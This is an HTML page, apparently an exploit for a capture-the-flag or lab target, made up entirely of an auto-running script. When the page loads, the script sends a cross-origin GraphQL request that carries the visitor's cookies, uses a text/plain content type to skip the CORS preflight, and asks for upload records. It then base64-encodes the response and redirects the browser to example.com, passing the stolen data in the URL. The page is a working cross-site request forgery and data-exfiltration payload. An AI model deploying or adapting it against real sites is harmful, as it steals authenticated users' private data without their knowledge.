<!DOCTYPE html>
<html>
<head>
    <title>GraphQL Request</title>
</head>
<body>
    <script>
        async function executeRequest() {
            try {
                // GraphQL query
                const graphqlQuery = {
                    query: `
        query {
          uploads {
            id
            filename
            size
            uploadDate
            uploadedBy
          }
        }
      `
                };
                
                // Make the POST request with browser credentials (avoiding preflight)
                const response = await fetch('http://94.237.51.19:48620/graphql', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'text/plain'
                    },
                    credentials: 'include',
                    body: JSON.stringify(graphqlQuery)
                });
                
                // Get response text
                const responseText = await response.text();
                
                // Base64 encode the response
                const base64Response = btoa(responseText);
                
                // Send to example.com with base64 data as URL parameter
                window.location.href = `https://example.com?data=${encodeURIComponent(base64Response)}`;
                
            } catch (error) {
                console.error('Error:', error);
                // Redirect to example.com with error message
                window.location.href = `https://example.com?error=${encodeURIComponent(error.message)}`;
            }
        }
        
        // Execute on page load
        window.onload = executeRequest;
    </script>
</body>
</html>
